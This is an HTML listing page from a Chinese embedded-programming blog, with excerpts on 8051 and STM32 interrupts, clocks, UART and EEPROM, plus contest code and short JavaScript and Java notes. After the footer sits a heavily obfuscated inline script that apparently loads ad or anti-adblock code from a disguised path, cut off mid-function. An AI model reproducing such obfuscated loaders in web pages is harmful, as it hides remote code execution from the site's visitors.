STC89C5X 系列单片机提供了 8 个中断请求源，它们分别是：外部中断 O(INTO)、外部中断 1(INT1)、外部中断 2(INT2)、外部中断 3(INT3)、定时器 0 中断、定时器 1 中断、定时器 2 中断、串口(UART)中断。
举例子来说，我们在写作业，突然水开了，那么我们就得去把水关了，然后再回来写作业。这其中的水开了，然后跑去关水都是中断，总之就是影响主要程序的就是中断；
那么定时器有什么好处呢？
①分时操作。CPU 可以分时为多个 I/O 设备服务，提高了计算机的利用率；
②实时响应。CPU 能够及时处理应用系统的随机事件，系统的实时性大大增 强；
③可靠性高。CPU 具有处理设备故障及掉电等突发性事件能力，从而使系统 可靠性提高
什么是定时器计数器 ①51 单片机有两组定时器/计数器，因为既可以定时，又可以计数，故称之 为定时器/计数器。
②定时器/计数器和单片机的 CPU 是相互独立的。定时器/计数器工作的过程 是自动完成的，不需要 CPU 的参与。
③51 单片机中的定时器/计数器是根据机器内部的时钟或者是外部的脉冲信 号对寄存器中的数据加 1。 有了定时器/计数器之后，可以增加单片机的效率，一些简单的重复加 1 的 工作可以交给定时器/计数器处理。CPU 转而处理一些复杂的事情。同时可以实 现精确定时作用。
什么是串口 串口是是采用串行通信方式的扩展接口
串行接口简称串口，也称串行通信接口或串行通讯接口，是采用串行通信方式的扩展接口。串行接口是指数据一位一位地顺序传送。
开始 为什么没用过直接配置的中断，不是说不能直接配置中断，而是很少，这就让大家以为不能单独配置中断；他需要一个命令才能开起中断，至于开启条件还是的理解内部结构框图
直接配置中断 配置中断0（中断0是外部中断，顾名思义，当你外部条件满足才能开启）——》按下独立按键3（外部中断0的开启条件就是按键3按下，至于是下降沿开启还是低电平开启，这取决于你的配置）——》中断开启；
//以配置外部中断0为例 void Init0() { IT0=1; IE0=0; EX0=1; EA=1; PX0=0; } 中断+定时器/计数器 ①首先配置好二者（共同配置），那么什么时候会触发中断呢，那就是当定时器/计数器溢出的时候，不如当时间达到TH0(&lt;&lt;8)+TL0=65535us，就会开始执行中断；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bba1462f2258b3bf4d60c5384b8dd38f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11e5427135b2abf7a7dd9f3ebde78d3e/" rel="bookmark">
			STM32一HSE/HSI调频
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
为什么要调频
什么是HSE 什么是HSI
配置HSE外部高速时钟
HSE配置
HSI配置
为什么要调频 在STM32中有很多的芯片外设，他们的时钟频率或许不是一样的，为了各个外设之间能够协调运行，我们就需要对某个外设进行调频，比如对USB\SDIO\HCLK\ADC等等调频，这些的是必要的，韦德就是满足运行要求。
什么是HSE HSE 是高速的外部时钟信号，可以由有源晶振或者无源晶振提供，频率从 4-16MHZ 不等。当 使用有源晶振时，时钟从 OSC_IN 引脚进入，OSC_OUT 引脚悬空，当选用无源晶振时，时钟从 OSC_IN 和 OSC_OUT 进入，并且要配谐振电容。
HSE 最常使用的就是 8M 的无源晶振。当确定 PLL 时钟来源的时候，HSE 可以不分频或者 2 分 频，这个由时钟配置寄存器 CFGR 的位 17：PLLXTPRE 设置，我们设置为 HSE 不分频。
什么是HSI HSI时钟信号由内部8MHz的RC振荡器产生，可直接作为系统时钟或在2分频后作为PLL输入。
HSI RC振荡器能够在不需要任何外部器件的条件下提供系统时钟。它的启动时间比HSE晶体振 荡器短。然而，即使在校准之后它的时钟频率精度仍较差。
在这里通过外部时钟或者内部时钟的一步一步配置来达到自己想要的时钟；
配置过程顺着这个图来；
配置HSE外部高速时钟 注:因为系统定义为频率为72M，所以想要修改频率的话，必须在修改之前把频率在此初始化
1、开启 HSE/HSI ，并等待 HSE/HSI 稳定 2、设置 AHB、APB2、APB1 的预分频因子
3、设置 PLL 的时钟来源，和 PLL 的倍频因子，设置各种频率主要就是在这里设置 4、开启 PLL，并等待 PLL 稳定 5、把 PLLCK 切换为系统时钟 SYSCL
HSE配置 void HSE_SetSysClk(uint32_t RCC_PLLMul_x) { ErrorStatus	HSEStartupStatus; //先把时钟初始化 RCC_DeInit(); //打开HSE RCC_HSEConfig(RCC_HSE_ON); //等待打开，打开需要一段时间，并且之后还得检测一下是否打开 HSEStartupStatus=RCC_WaitForHSEStartUp(); //判断是否打开成功，否则跳转到最下面，执行else里面的程序 if(HSEStartupStatus==SUCCESS) { //打开闪存器，把其他几个数据存入，待用 FLASH_PrefetchBufferCmd(FLASH_PrefetchBuffer_Enable); //设置闪存的周期，这里按最大的来，大了没事，小了就会还有数据没进来 FLASH_SetLatency(FLASH_Latency_2); //把其他数据开始存入 RCC_HCLKConfig(RCC_SYSCLK_Div1); RCC_PCLK1Config(RCC_HCLK_Div2); RCC_PCLK2Config(RCC_HCLK_Div1); //调整倍率 RCC_PLLConfig(RCC_PLLSource_HSE_Div1,RCC_PLLMul_x); //打开PLL，这里如果你是使用其他的配置时钟的话例如：HSE/HSI/PLL RCC_PLLCmd(ENABLE); //等待PLL稳定 while(RCC_GetFlagStatus(RCC_FLAG_PLLRDY)==RESET); //稳定之后把系统时钟换成我们配置的时钟 RCC_SYSCLKConfig(RCC_SYSCLKSource_PLLCLK); //等待时钟修改成功 while(RCC_GetSYSCLKSource()!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11e5427135b2abf7a7dd9f3ebde78d3e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab7685d98455f07963768d498782837b/" rel="bookmark">
			STM32--外部中断——EXIT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
NVIC
配置NVIC
EXIT
功能框图
总结
NVIC NVIC 是嵌套向量中断控制器，控制着 整个芯片中断相关的功能，它跟内核紧密耦合，是内核里面的一个外设。
要想使用中断,就需要配置这个内部中断,而外部只是一个触发信号;
配置NVIC 下面是常用的配置:
为了方便,使用固件库函数
//关于NVIC中断的结构体 typedef struct { uint8_t NVIC_IRQChannel; /*!&lt; Specifies the IRQ channel to be enabled or disabled. This parameter can be a value of @ref IRQn_Type (For the complete STM32 Devices IRQ Channels list, please refer to stm32f10x.h file) */ uint8_t NVIC_IRQChannelPreemptionPriority; /*!&lt; Specifies the pre-emption priority for the IRQ channel specified in NVIC_IRQChannel. This parameter can be a value between 0 and 15 as described in the table @ref NVIC_Priority_Table */ uint8_t NVIC_IRQChannelSubPriority; /*!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab7685d98455f07963768d498782837b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b965eb63698ee73b3d03245a5515e2af/" rel="bookmark">
			STM32—按键中断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
中断简介
程序
注：
中断简介 （1） EXTI(外部中断)：EXTI是ST公司在其STM32产品上扩展的外中断控制。它负责管理映射到GPIO引脚上的外中断和片内几个集成外设的中断，以及软件中断。其输出最终被映射到NVIC的相应通道。因此，配置EXTI中断的过程必然包含对NVIC的配置。
（2） NVIC(嵌套向量中断)：嵌套向量中断控制器，属于内核外设， 管理着包括内核和片上所有外设的中断相关的 功能。嵌套向量中断控制器(NVIC)和处理器核的接口紧密相连，可以实现低延迟的中断处理和高效地 处理晚到的中断。
至于两者的作用，我们就举个例子来说一下。
例如下面配置EXTI0的过程，就要首先配置EXTI控制器（使能相应的中断线，选择中断/事件模式，触发边沿极性），然后再配置NVIC控制器（EXTI0映射在NVIC上的通道号，中断优先级，中断屏蔽状态）。也就是EXTI类比成小门，而NVIC是大门，二者是相互联通的，我们使用EXTI来选择中断的中断源，NVIC判决中断源的执行顺序。
程序的编写就是按照这个流程来的，这里是有两条线路，一条事件中断，另一条为NVIC中断控制器，编写程序已NVIC中断为例！
程序 为了大家更好的理解，我们就写一个按键中断来检验一下。
LED.c
#include "bsp_led.h" /** * @brief 初始化控制LED的IO * @param 无 * @retval 无 */ void LED_GPIO_Config(void) {	GPIO_InitTypeDef	GPIO_InitStruct; RCC_APB2PeriphClockCmd(LED_GPIO_CLK,ENABLE); GPIO_InitStruct.GPIO_Mode=GPIO_Mode_Out_PP ; GPIO_InitStruct.GPIO_Pin=LED_RED_PIN|LED_GREEN_PIN|LED_YELLOW_PIN; GPIO_InitStruct.GPIO_Speed=GPIO_Speed_50MHz ; GPIO_SetBits(LED_PORT,LED_RED_PIN|LED_GREEN_PIN|LED_YELLOW_PIN); GPIO_Init(LED_PORT,&amp;GPIO_InitStruct); } LED.h
#ifndef __LED_H #define	__LED_H #include "stm32f10x.h" //LED #define LED_GPIO_CLK	RCC_APB2Periph_GPIOB #define LED_GREEN_PIN	GPIO_Pin_0 #define LED_PORT	GPIOB #define LED_RED_PIN	GPIO_Pin_5 #define LED_YELLOW_PIN	GPIO_Pin_1 #define	ON	1 #define OFF	0 #define	LED_GREEN(a)	if(a)\ {GPIO_ResetBits(LED_PORT,LED_GREEN_PIN);}\ else\ {GPIO_SetBits(LED_PORT,LED_GREEN_PIN);} #define	LED_RED(a)	if(a)\ {GPIO_ResetBits(LED_PORT,LED_RED_PIN);}\ else\ {GPIO_SetBits(LED_PORT,LED_RED_PIN);} #define	LED_YELLOW(a)	if(a)\ {GPIO_ResetBits(LED_PORT,LED_YELLOW_PIN);}\ else\ {GPIO_SetBits(LED_PORT,LED_YELLOW_PIN);} //打开灯	#define	LED_G	{LED_GREEN(ON);LED_RED(OFF);LED_YELLOW(OFF);}	#define	LED_R	{LED_GREEN(OFF);LED_RED(ON);LED_YELLOW(OFF);} #define	LED_B	{LED_GREEN(OFF);LED_RED(OFF);LED_YELLOW(ON);} #define LED_G_TOGGLE	{LED_PORT-&gt;ODR^=GPIO_Pin_0;} //BEEPER #define BEEP_GPIO_CLK	RCC_APB2Periph_GPIOA #define BEEP_PIN	GPIO_Pin_8 #define BEEP_PORT	GPIOA void LED_GPIO_Config(void); void BEEP_Config(void); #endif /* __LED_H */ KEY.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b965eb63698ee73b3d03245a5515e2af/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2020c6d4724c3bce6b407b22ff55f9e8/" rel="bookmark">
			STM32—串口发送于接收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
串口通讯
配置
1、初始化IO口
2、初始化串口
1——发送一个字节
2——发送数组
3——发送字符串
4——发送半字
5——串口的重定向
中断配置
串口通讯 串口通讯 (Serial Communication) 是一种设备间非常常用的串行通讯方式，因为它简单便捷，因此 大部分电子设备都支持该通讯方式，电子工程师在调试设备时也经常使用该通讯方式输出调试 信息。
所以很有必要去了解串口。
配置 既然想要使用串口，那么就需要懂得配置，只有配置出我们想要的，才能保证设备之间的通讯。
首先，寻找到与串口相对于的IO口，这里我以PA9,PA10,为例。
1、初始化GPIO口 USART_GPIO_Config() { GPIO_InitTypeDef	GPIO_InitStruct ; //使能时钟一定要提前，不然会出现乱码的情况 RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA,ENABLE); RCC_APB2PeriphClockCmd(RCC_APB2Periph_USART1,ENABLE); GPIO_InitStruct.GPIO_Pin=GPIO_Pin_9; GPIO_InitStruct.GPIO_Mode=GPIO_Mode_AF_PP ;	//复用输出，根据手册得出 GPIO_InitStruct.GPIO_Speed=GPIO_Speed_50MHz; GPIO_Init(GPIOA, &amp;GPIO_InitStruct ); GPIO_InitStruct.GPIO_Mode=GPIO_Mode_IN_FLOATING ; GPIO_InitStruct.GPIO_Pin=GPIO_Pin_10; GPIO_Init(GPIOA, &amp;GPIO_InitStruct ); USART_InitTypeDef	USART_InitStruct; } 串口的发送端口配置模式：复用输出，配置其他的模式会出现乱码。
串口的接收端口配置模式：浮空输入，因为是接收端口。
2、初始化串口 USART_Config() { USART_InitTypeDef	USART_InitStruct; //下面的配置都是依据通讯设备之间的约定来配置的，二者必须约定一致，否则会出现乱码 USART_InitStruct.USART_BaudRate=115200;// USART_InitStruct.USART_HardwareFlowControl=USART_HardwareFlowControl_None; USART_InitStruct.USART_Mode=USART_Mode_Rx|USART_Mode_Tx; USART_InitStruct.USART_Parity=USART_Parity_No; USART_InitStruct.USART_StopBits=USART_StopBits_1; USART_InitStruct.USART_WordLength=USART_WordLength_8b; USART_Init( USART1,&amp;USART_InitStruct); NVIC_Config();//中断初始化 USART_ITConfig(USART1,USART_IT_RXNE,ENABLE);//当符合条件就进入中断 USART_Cmd(USART1,ENABLE);//最后一步，使能串口 } 这样只是把串口配置好了，但是二者的协议还没写好，对于STM32来说，只要调用相应的函数就可以。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2020c6d4724c3bce6b407b22ff55f9e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d48245a6c661736ed38107a29df28af4/" rel="bookmark">
			蓝桥杯十二届省赛
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是我备赛时写的代码，还挺好，功能全部实现。有意者私
main.c #include "Define.h" u8 flag=1; u8 time_key,test; bit flag_V_G; u8 time_adc; u16 U16_V,U16_V_pro; u16 frequence_pro; bit flag_LED; u16 time_key7; void Key_pross() { if(time_key&gt;=10) { time_key=0; Key_scan(); if(trg&amp;0x08)//4 { flag++; flag%=3; } else if(trg&amp;0x04)//5 flag_V_G=~flag_V_G; else if(trg&amp;0x02)//6 U16_V_pro=U16_V;	if(con&amp;0x01) time_key7++; else if(con==0x00&amp;&amp;trg==0x00) { if(time_key7&gt;=100) { flag_LED=~flag_LED; time_key7=0; } else if(time_key7!=0) { time_key7=0; frequence_pro=frequence; } } } } u8 LED=0XFF; void LED_prosss() { if(flag_LED==0) { if(U16_V&gt;U16_V_pro) LED&amp;=~0x01; else LED|=0X01; if(frequence&gt;frequence_pro) LED&amp;=~0x02; else LED|=0X02; if(flag==0) LED&amp;=~0x04; else LED|=0X04; if(flag==1) LED&amp;=~0x08; else LED|=0X08; if(flag==2) LED&amp;=~0x10; else LED|=0X10; Device_Ctri(0x80,LED); } else Device_Ctri(0x80,0xff); } void ADC_pross() { if(time_adc&gt;=100) { time_adc=0; U16_V=ADC_read(0x43)*100/51; } } void Smg_pross() { if(flag==0)//频率显示 { Smg_show[0]=Smg_code[15]; Smg_show[1]=0x00; Smg_show[2]=0x00; Smg_show[3]=Smg_code[frequence&gt;9999 ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d48245a6c661736ed38107a29df28af4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fb0592c582a115ae64f7e9d135e1fb7/" rel="bookmark">
			蓝桥杯单片机十二届国赛
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		main.c
#include "Define.h" bit flag,flag_set; u8 flag_display; u8 time_sonic; u16 length,length_save; u8 time_key,test; bit flag_C_F; u8 set_time[5]={2,3,5,7,9}; u8 compare_time=2; u8 local_time; u16 set_length=20,set_length_compare; u8 G_D_Z=0; bit flag_sonic; u16 length_max=0,length_min=100,length_arv=0; bit flag_light=1,flag_light_pro; u8 time_adc,ligth; u8 Sec_pro; u16 sonic_count; u8 LED=0XFF; u8 count=0; void adc_process() { if(time_adc&gt;=100) { time_adc=0; Read_adc(); ligth=Read_adc(); //	if(flag_C_F==0) //	{ flag_light_pro=flag_light; if(ligth&lt;50) flag_light=0; else flag_light=1; if(flag_light_pro==1&amp;&amp;flag_light==0) { flag_sonic=1;//打开触发 } //	} if(length_save&lt;=10) { write_adc(51); } else if(length_save&gt;=80) { write_adc(255); } else { write_adc((u8)2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9fb0592c582a115ae64f7e9d135e1fb7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b33f7faa0789a47300fb701f1aa3d20c/" rel="bookmark">
			STM32—EEPROM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 EEPROM作为掉电不丢失的储存器，在使用上还是比较广泛的，
其可重复擦写，电擦除，使用方便 。
这里主要是以AT24C02为例介绍
硬件设计 Pin Configurations
该电路图设置下，A0—A2都是接地，所以EEPROM的地址为0x1010 000.
SDA和SCL分别与I2C相连，二者数据交换。
WP是写保护端口，这里直接接地，就没有写保护的功能，当然这不是说写保护不重要，只是在此处教学没有太大的用途，要是想控制WP，那就使WP与GPIO相连。
协议 写入 又协议图可知，I2C协议就是这个，所以我们可以把I2C协议拉出来使用。
向串行EEPROM指定地址写入若干数据，采用页写操作提高写入效率。
字节写入的话，每写完一次就需要判断是否写入完成，这一很麻烦。
于是我们就采用突发写入，也就是连续写入，这样就能直接写入多个字节。
/* ********************************************************************************************************* * 函 数 名: ee_ReadBytes * 功能说明: 从串行EEPROM指定地址处开始读取若干数据 * 形 参：_usAddress : 起始地址 * _usSize : 数据长度，单位为字节 * _pReadBuf : 存放读到的数据的缓冲区指针 * 返 回 值: 0 表示失败，1表示成功 ********************************************************************************************************* */ uint8_t ee_ReadBytes(uint8_t *_pReadBuf, uint16_t _usAddress, uint16_t _usSize) { uint16_t i; /* 采用串行EEPROM随即读取指令序列，连续读取若干字节 */ /* 第1步：发起I2C总线启动信号 */ i2c_Start(); /* 第2步：发起控制字节，高7bit是地址，bit0是读写控制位，0表示写，1表示读 */ i2c_SendByte(EEPROM_DEV_ADDR | EEPROM_I2C_WR); /* 此处是写指令 */ /* 第3步：等待ACK */ if (i2c_WaitAck() !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b33f7faa0789a47300fb701f1aa3d20c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0d32db2ca8ad7e222debdbfbf4d4a1c/" rel="bookmark">
			js 生成随机数的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 js 生成随机数的方式 Math.random()new Date().getTime()randomjsglobalThis.crypto.getRandomValues globalThis.crypto.getRandomValues(new Uint32Array(10)) // logs Uint32Array(10) [4070084714, 3331714512, 167030621, 3861175006, 162926641, 1318663833, 2059866687, 3205865186, 753962239, 1649391101, buffer: ArrayBuffer(40), byteLength: 40, byteOffset: 0, length: 10, Symbol(Symbol.toStringTag): 'Uint32Array'] 0:4070084714 1:3331714512 2: 167030621 3: 3861175006 4: 162926641 5: 1318663833 6: 2059866687 7: 3205865186 8: 753962239 9: 1649391101 buffer: ArrayBuffer(40) byteLength: 40 byteOffset: 0 length: 10 Symbol(Symbol.toStringTag): "Uint32Array" [[Prototype]]: TypedArray 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1fe5390546dd246d9f714ef90ba21a2/" rel="bookmark">
			StructuredTaskScope
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		StructuredTaskScope是为了解决主线程和子线程之间的可见性(observability)，消除因取消和关闭而产生的常见风险，例如线程泄漏和取消延迟而引入的一个新组件。
先来看一个简单的例子：
我们有一个handle()方法，该方法需要分别调用另外两个方法findUser()和fetchOrder()，将它们的结果组合起来返回给上游，这两个方法中都有I/O操作相互之间没有关联性，为了提高效率我们使用了一个线程池，并发的执行这两个方法，代码如下：
Response handle() throws ExecutionException, InterruptedException { Future&lt;String&gt; user = esvc.submit(() -&gt; findUser()); Future&lt;Integer&gt; order = esvc.submit(() -&gt; fetchOrder()); String theUser = user.get(); // Join findUser int theOrder = order.get(); // Join fetchOrder return new Response(theUser, theOrder); } 这段代码有以下几个问题
如果findUser()报错，主线程也会返回异常，但是另一个方法由于在不同的线程中，感知不到异常会继续执行下去，这种称为线程泄露如果handle()被中断，findUser()和fetchOrder()会继续执行下去，也会造成线程泄露如果findUser()需要执行很长时间，而fetchOrder()一开始就抛出了异常，主线程会一直block在user.get()上直到该结果返回，白白浪费了时间。
除此之外，主线程和子线程之间并没有关联，异常调用栈也不在一起，发生错误之后也难以排查和调试。 StructuredTaskScope就是为解决这些问题而创建的，我们看一个例子：
Response handle() throws ExecutionException, InterruptedException { try (var scope = new StructuredTaskScope.ShutdownOnFailure()) { Supplier&lt;String&gt; user = scope.fork(() -&gt; findUser()); Supplier&lt;Integer&gt; order = scope.fork(() -&gt; fetchOrder()); scope.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1fe5390546dd246d9f714ef90ba21a2/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/52/">«</a>
	<span class="pagination__item pagination__item--current">53/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/54/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5